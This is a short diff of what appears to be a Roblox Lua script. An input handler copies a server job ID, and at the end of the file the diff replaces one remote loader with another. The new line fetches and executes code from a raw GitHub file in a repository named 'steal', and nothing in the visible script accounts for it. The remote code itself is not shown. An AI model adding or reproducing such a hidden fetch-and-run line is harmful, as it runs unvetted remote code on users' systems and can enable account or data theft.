@@ -765,4 +765,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/gfddfg"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hoasdw/steal/refs/heads/main/hjklkhj1"))()
